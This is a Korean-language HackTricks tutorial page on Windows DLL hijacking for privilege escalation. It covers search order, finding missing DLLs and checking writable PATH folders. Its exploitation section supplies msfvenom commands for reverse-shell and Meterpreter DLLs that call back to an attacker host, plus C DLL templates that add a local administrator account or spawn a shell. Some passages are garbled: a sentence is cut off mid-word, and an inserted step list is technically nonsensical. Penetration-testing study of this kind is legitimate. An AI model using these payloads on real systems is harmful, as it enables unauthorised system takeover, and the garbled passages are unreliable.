# Dll Hijacking

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**해킹 경력**에 관심이 있다면 - **우리는 고용 중입니다!** (_유창한 폴란드어 필수_).

{% embed url="https://www.stmcyber.com/careers" %}

## 기본 정보

DLL Hijacking은 신뢰할 수 있는 응용 프로그램을 조작하여 악성 DLL을 로드하도록 하는 것을 의미합니다. 이 용어는 **DLL 스푸핑, 인젝션 및 사이드로딩**과 같은 여러 전술을 포함합니다. 이는 주로 코드 실행, 지속성 달성 및 드물게 권한 상승을 위해 사용됩니다. 여기서는 권한 상승에 중점을 두지만, 해킹 방법은 목표에 관계없이 일관되게 유지됩니다.

### 일반적인 기법

DLL Hijacking에는 응용 프로그램의 DLL 로딩 전략에 따라 효과가 달라지는 여러 가지 방법이 사용됩니다:

1. **DLL 교체**: 정품 DLL을 악성 DLL로 교체하고 원래 DLL의 기능을 보존하기 위해 DLL 프록시를 사용하는 선택적인 방법입니다.
2. **DLL 검색 순서 조작**: 악성 DLL을 정품 DLL보다 먼저 검색 경로에 배치하여 응용 프로그램의 검색 패턴을 악용합니다.
3. **유령 DLL Hijacking**: 응용 프로그램이 존재하지 않는 필수 DLL로 인식하여 로드하도록 악성 DLL을 생성합니다.
4. **DLL 리다이렉션**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정하여 응용 프로그램을 악성 DLL로 이동시킵니다.
5. **WinSxS DLL 교체**: WinSxS 디렉토리에서 정품 DLL을 악성 DLL로 대체하는 방법으로, DLL 사이드로딩과 자주 관련됩니다.
6. **상대 경로 DLL Hijacking**: 악성 DLL을 사용자가 제어하는 디렉토리에 복사한 응용 프로그램과 유사한 이진 프록시 실행 기법입니다.


## 누락된 Dll 찾기

시스템 내에서 누락된 Dll을 찾는 가장 일반적인 방법은 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고 다음 2개의 필터를 **설정**하는 것입니다:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

그리고 **파일 시스템 활동**만 표시하세요:

![](<../../.gitbook/assets/image (314).png>)

**일반적인 누락된 dll을 찾고 있다면** 몇 초 동안 실행을 **유지**하세요.\
**특정 실행 파일 내에서 누락된 dll을 찾고 있다면** "Process Name" "contains" "\<exec name>"과 같은 **다른 필터를 설정**하고 이를 실행한 후 이벤트 캡처를 중지하세요.

## 누락된 Dll 악용

권한 상승을 위해 가장 좋은 기회는 **권한 있는 프로세스가 로드하려고 하는 dll을 작성**할 수 있는 것입니다. 따라서, 우리는 **원래 dll보다 먼저 검색되는 폴더**에 dll을 작성할 수 있을 것이거나, dll이 **어떤 폴더에도 존재하지 않는** 폴더에 dll을 검색할 수 있는 폴더에 작성할 수 있을 것입니다.

### Dll 검색 순서

**[Microsoft 문서](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**에서 Dll이 특정하게 로드되는 방법을 찾을 수 있습니다.

**Windows 응용 프로그램**은 특정 순서에 따라 **미리 정의된 검색 경로**를 따라 DLL을 찾습니다. DLL Hijacking 문제는 해로운 DLL이 이러한 디렉토리 중 하나에 전략적으로 배치되어 정품 DLL보다 먼저 로드되도록 보장할 때 발생합니다. 이를 방지하기 위한 해결책은 응용 프로그램이 필요로 하는 DLL을 참조할 때 절대 경로를 사용하는 것입니다.

32비트 시스템에서의 **DLL 검색 순서**는 다음과 같습니다:

1. 응용 프로그램이 로드된 디렉토리.
2. 시스템 디렉토리. 이 디렉토리의 경로를 얻으려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하세요.(_C:\Windows\System32_)
3. 16비트 시스템 디렉토리. 이 디렉토리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows 디렉토리. 이 디렉토리의 경로를 얻으려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하세요.
1. (_C:\Windows_)
5. 현재 디렉토리.
6. PATH 환경 변수에 나열된 디렉토리. 이는 **App Paths** 레지스트리 키로 지정된 개별 응용 프로그램 경로는 포함되지 않습니다. DLL 검색 경로를 계산할 때 **App Paths** 키는 사용되지 않습니다.

이것은 **SafeDllSearchMode**가 활성화된 경우의 **기본** 검색 순서입니다. 비활성화된 경우 현재 디렉토리가 두 번째로 상승합니다. 이 기능을 비활성화하려면 **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 만들고 0으로 설정하면 됩니다(기본값은 활성화).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**와 함께 호출되면 검색은 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉토리에서 시작됩니다.

마지막으로, **dll은 이름 대신 절대 경로를 지정하여 로
#### Windows 문서에서 DLL 검색 순서의 예외 사항

Windows 문서에는 표준 DLL 검색 순서에서 특정 예외 사항이 기록되어 있습니다:

- **이미 메모리에 로드된 DLL과 이름이 같은 DLL**을 만나면, 시스템은 일반적인 검색을 우회합니다. 대신, 리다이렉션 및 매니페스트를 확인한 후 메모리에 이미 있는 DLL로 기본 설정합니다. **이 시나리오에서는 시스템이 DLL을 검색하지 않습니다**.
- DLL이 현재 Windows 버전에 대해 **알려진 DLL**로 인식되는 경우, 시스템은 알려진 DLL의 버전과 해당 종속 DLL을 사용하여 **검색 프로세스를 건너뜁니다**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 알려진 DLL의 목록이 저장됩니다.
- **DLL에 종속성이 있는 경우**, 초기 DLL이 전체 경로를 통해 식별되었는지 여부에 관계없이, 종속 DLL의 검색은 **모듈 이름만으로 표시된 것처럼** 수행됩니다.


### 권한 상승

**요구 사항**:

- **다른 권한** (수평 또는 측면 이동)으로 작동하거나 작동할 **프로세스**를 식별하십시오. 이 프로세스는 **DLL이 없는** 상태입니다.
- **DLL이 검색될 수 있는** **디렉토리**에 대한 **쓰기 액세스**가 가능한지 확인하십시오. 이 위치는 실행 파일의 디렉토리 또는 시스템 경로 내의 디렉토리일 수 있습니다.

그래, 요구 사항을 찾는 것은 복잡합니다. **기본적으로 권한이 있는 실행 파일이 DLL이 없는 것은 이상하고**, **시스템 경로 폴더에 기본적으로 쓰기 권한을 가지는 것은 더욱 이상합니다**. 하지만, 설정이 잘못된 환경에서는 이러한 것이 가능합니다.\
요구 사항을 충족하는 운이 좋은 경우, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인할 수 있습니다. 이 프로젝트의 **주요 목표는 UAC 우회**이지만, 쓰기 권한이 있는 폴더의 경로를 변경하는 것만으로 사용할 수 있는 Windows 버전의 Dll hijacking의 **PoC**를 찾을 수 있을 것입니다.

폴더의 **권한을 확인**하려면 다음을 수행할 수 있습니다:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내의 모든 폴더의 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
다음 명령어를 사용하여 실행 파일의 imports 및 dll의 exports를 확인할 수도 있습니다:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**권한 상승을 위해 Dll Hijacking을 악용하는 방법에 대한 전체 가이드**는 다음을 확인하십시오:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 자동화된 도구

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 시스템 PATH 내의 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하기 위한 다른 흥미로운 자동화 도구로는 **PowerSploit 함수**인 _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_이 있습니다.

### 예시

취약한 시나리오를 발견한 경우 성공적으로 악용하기 위해 가장 중요한 것은 **실행 파일이 가져올 모든 함수를 적어도 내보내는 dll을 생성하는 것**입니다. 그러나 Dll Hijacking은 중간 무결성 수준에서 높은 수준으로 [UAC를 우회하며(../authentication-credentials-uac-and-efs.md#uac)] 또는 [높은 수준에서 SYSTEM으로 상승](./#from-high-integrity-to-system)하는 데 유용합니다. dll hijacking을 위한 실행에 초점을 맞춘 이 dll hijacking 연구에서 유효한 dll을 생성하는 방법의 예시를 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **다음 섹션**에서는 **유용한 템플릿으로 사용할 수 있는 몇 가지 기본 dll 코드**를 찾을 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll 프록시화**

기본적으로 **Dll 프록시**는 **로드될 때 악성 코드를 실행**할 수 있지만 실제 라이브러리로의 모든 호출을 **중계하여 노출**하고 **작동**할 수 있는 Dll입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 실제 라이브러리를 프록시화하고 프록시화된 dll을 생성하거나 Dll을 지정하고 프록시화된 dll을 생성할 수 있습니다.

### **Meterpreter**

**rev shell 가져오기 (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**미터프리터(x86) 얻기:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
```

**DLL Hijacking:**

DLL Hijacking은 악용 가능한 취약점으로, 악성 DLL 파일을 실행 가능한 경로에 놓아 해당 DLL 파일이 실행될 때 악성 코드가 실행되도록 하는 기법입니다. 이를 통해 로컬 권한 상승을 수행할 수 있습니다.

DLL Hijacking을 수행하기 위해 다음 단계를 따릅니다:

1. 대상 시스템에서 실행 가능한 파일의 확장자를 확인합니다. (예: .exe, .dll, .ocx 등)
2. 해당 확장자를 가진 파일 중 실행 가능한 파일을 찾습니다.
3. 해당 파일의 이름을 악성 DLL 파일의 이름으로 변경합니다.
4. 악성 DLL 파일을 실행 가능한 경로에 놓습니다.
5. 대상 시스템에서 해당 파일을 실행하면 악성 DLL 파일이 실행되어 로컬 권한 상승이 이루어집니다.

DLL Hijacking은 대상 시스템의 환경 변수, DLL 검색 경로, 애플리케이션 설정 파일 등을 분석하여 취약점을 찾을 수 있습니다. 이를 통해 공격자는 시스템에 대한 권한 상승을 수행할 수 있습니다.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 버전만 확인했습니다):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 자체

여러 경우에 Dll을 컴파일할 때 희생자 프로세스에 의해 로드될 여러 함수를 **내보내야** 한다는 점에 유의하십시오. 이러한 함수가 없으면 **바이너리가 로드할 수 없으며** 공격이 실패할 것입니다.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 참고 자료
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

만약 **해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **저희는 고용 중입니다!** (_유창한 폴란드어 작문 및 구사 능력 필요_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
